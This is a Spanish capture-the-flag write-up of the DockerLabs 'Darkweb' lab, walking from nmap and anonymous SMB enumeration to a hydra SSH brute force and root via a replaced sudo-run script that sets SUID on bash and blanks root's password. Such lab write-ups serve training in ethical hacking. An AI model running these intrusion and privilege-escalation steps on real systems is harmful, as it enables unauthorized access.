---
title: Darkweb
description: DockerLabs es una plataforma gratuita diseñada para practicar hacking ético al alcance de todo el mundo utilizando Docker. DockerLabs ofrece un entorno seguro y accesible para desplegar laboratorios vulnerables de la forma más eficiente y sencilla posible.
date: 2025-01-24
toc: true
pin: false
image:
 path: /assets/img/dockerlabs-writeup-darkweb/darkweb_logo.png
categories:
  - Docker Labs
tags:
  - linux
  - dockerlabs
  - ssh
  - smb
  - ftp
  - misconfigurations
  - data leaks
  - password attacks
  - onion
  - tor
  - sudo abuse
  - information gathering
  - misconfiguration exploitation
  - data leak exploitation
  - privilege escalation

---
## Information Gathering

El análisis inicial comienza con el comando ping para confirmar la accesibilidad de la máquina objetivo en la red.

```terminal
/home/kali/Documents/dockerlabs/darkweb:-$ ping -c 1 127.17.0.2
PING 127.17.0.2 (127.17.0.2) 56(84) bytes of data.
64 bytes from 127.17.0.2: icmp_seq=1 ttl=64 time=0.077 ms

--- 127.17.0.2 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 0.077/0.077/0.077/0.000 ms
```

Realizo un escaneo agresivo de puertos con nmap, lo que me permite identificar rápidamente todos los puertos abiertos.

```terminal
/home/kali/Documents/dockerlabs/darkweb:-$ sudo nmap -p- --open -sS --min-rate 5000 -n -Pn -vvv -oG nmap1 127.17.0.2
Host: 127.17.0.2 ()     Status: Up
Host: 127.17.0.2 ()     Ports: 22/open/tcp//ssh///, 139/open/tcp//netbios-ssn///, 445/open/tcp//microsoft-ds///       Ignored State: closed (65532)
```

Profundizo en los puertos detectados, recopilando información detallada sobre los servicios y versiones en ejecución.

```terminal
/home/kali/Documents/dockerlabs/darkweb:-$ sudo nmap -sCV -p22,139,445 -vvv -oN nmap2 127.17.0.2
PORT    STATE SERVICE     REASON         VERSION
22/tcp  open  ssh         syn-ack ttl 64 OpenSSH 9.6p1 Ubuntu 3ubuntu13.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 aa:df:30:8b:17:c5:3c:80:1c:88:f1:f8:c0:ac:cc:fa (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBIwcQLG7cG3zykVrxNhY3Zf8Oeu1rZrDHXovo6xce8rYj7bvEKWHidRa32QtZQlumnfzwSMFrfeat8T1st72IVI=
|   256 aa:6a:33:65:fc:54:b7:8f:98:ff:1f:3d:79:a3:05:3c (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIPi9HNorx51v8Q8nh0LuhsEgTIC1KB/UrY6Sw5/Im9y4
139/tcp open  netbios-ssn syn-ack ttl 64 Samba smbd 4.6.2
445/tcp open  netbios-ssn syn-ack ttl 64 Samba smbd 4.6.2
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
| p2p-conficker: 
|   Checking for Conficker.C or higher...
|   Check 1 (port 28228/tcp): CLEAN (Couldn't connect)
|   Check 2 (port 46105/tcp): CLEAN (Couldn't connect)
|   Check 3 (port 29351/udp): CLEAN (Failed to receive data)
|   Check 4 (port 64790/udp): CLEAN (Failed to receive data)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2024-12-31T16:30:59
|_  start_date: N/A
|_clock-skew: 0s
```

---
## Misconfiguration & Data Leak Exploitation

Empiezo la enumeración explorando recursos compartidos de SMB.

```terminal
/home/kali/Documents/dockerlabs/darkweb:-$ smbclient -L //127.17.0.2/ -N
```

![](assets/img/dockerlabs-writeup-darkweb/darkweb1_1.png)

El resultado muestra un recurso compartido llamado `darkshare` que permite acceso anónimo.

```terminal
/home/kali/Documents/dockerlabs/darkweb:-$ smbclient //127.17.0.2/darkshare -N 
```

![](assets/img/dockerlabs-writeup-darkweb/darkweb1_2.png)

Accedo al recurso `darkshare` y descargo los archivos dentro.

```terminal
smb: \> get ilegal.txt 
getting file \ilegal.txt of size 204 as ilegal.txt (199.2 KiloBytes/sec) (average 505.1 KiloBytes/sec)

/home/kali/Documents/dockerlabs/darkweb:-$ cat ilegal.txt
```

![](assets/img/dockerlabs-writeup-darkweb/darkweb1_3.png)

El contenido del archivo `ilegal.txt` está cifrado utilizando el cifrado César. Utilizo un servicio en línea [Dcode](https://www.dcode.fr/cifrado-esar) para descifrar el archivo. El texto revelado contiene una dirección `.onion` que apunta a un servicio en la red Tor.

![](assets/img/dockerlabs-writeup-darkweb/darkweb1_4.png)

Al acceder al sitio `.onion`, exploro varias rutas sin encontrar contenido relevante.

![](assets/img/dockerlabs-writeup-darkweb/darkweb2_1.png)
![](assets/img/dockerlabs-writeup-darkweb/darkweb2_2.png)
![](assets/img/dockerlabs-writeup-darkweb/darkweb2_3.png)

Hasta que llego a la siguiente ruta, `Access the Darkest Web` > `Hidden Marketplace` > `Confidential List's Passwords`. En esta ubicación, se encuentra un archivo de texto que contiene una lista de contraseñas.

![](assets/img/dockerlabs-writeup-darkweb/darkweb2_4.png)

Dado que no obtuve nada más relevante, intento un ataque de fuerza bruta al servicio SSH. Basándome en la temática de la máquina, utilizo el nombre de usuario `dark` y la lista de contraseñas obtenida.

```terminal
/home/kali/Documents/dockerlabs/darkweb:-$ hydra -l dark -P passlist.txt ssh://172.17.0.2 -t 60 -I
[22][ssh] host: 172.17.0.2   login: dark   password: oniondarkgood
```

![](assets/img/dockerlabs-writeup-darkweb/darkweb2_5.png)

El ataque tiene éxito y obtengo las credenciales SSH.

```terminal
/home/kali/Documents/dockerlabs/darkweb:-$ ssh dark@127.17.0.2
dark@127.17.0.2's password: oniondarkgood

dark@kali:~$ id
uid=1001(dark) gid=1001(dark) groups=1001(dark),100(users)
```

---
## Privilege Escalation

```terminal
dark@kali:~$ cat /etc/passwd | grep /bash$
root:x:0:0:root:/root:/bin/bash
dark:x:1001:1001:dark,,,:/home/dark:/bin/bash
```

El usuario `dark` tiene privilegios para ejecutar el script `/home/dark/hidden.py` con permisos de `sudo`, sin necesidad de contraseña.

```terminal
dark@kali:~$ sudo -l
Matching Defaults entries for dark on kali:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User dark may run the following commands on kali:
    (ALL : ALL) NOPASSWD: /home/dark/hidden.py
```

El script ejecuta el archivo `/usr/local/bin/Update.sh` con permisos de `root`.

```terminal
dark@kali:~$ cat hidden.py 
```

![](assets/img/dockerlabs-writeup-darkweb/darkweb3_1.png)

```terminal
dark@kali:~$ sudo /home/dark/hidden.py
root
Script ejecutado con éxito.
```

El archivo `/usr/local/bin/Update.sh` es propiedad del usuario `root` y no tiene permisos de escritura para otros usuarios. Sin embargo, tiene permisos de escritura para el grupo `root` y permisos de lectura para todos los usuarios.

En lugar de modificar el contenido existente del archivo (lo cual no puedo hacer directamente), lo elimino y creo uno completamente nuevo. Este cambio es posible porque el directorio en el que se encuentra `/usr/local/bin/` tiene permisos que me permiten borrar y crear archivos nuevos como el usuario `dark`.

```terminal
dark@kali:~$ rm /usr/local/bin/Update.sh

dark@kali:~$ cat /usr/local/bin/Update.sh
#!/bin/bash

chmod u+s /bin/bash
```

Este nuevo script establece el bit SUID en el binario de Bash `/bin/bash`, lo que permitirá ejecutar Bash con privilegios de `root`.

Como el script `hidden.py` ejecuta `/usr/local/bin/Update.sh` con permisos de `root`, el bit SUID se aplica correctamente al binario de Bash.

```terminal
dark@kali:~$ sudo /home/dark/hidden.py
Script ejecutado con éxito.

dark@kali:~$ /bin/bash -p
bash-5.2# sed -i 's/root:x:/root::/g' /etc/passwd && su

root@kali:/home/dark# id
uid=0(root) gid=0(root) groups=0(root)
```
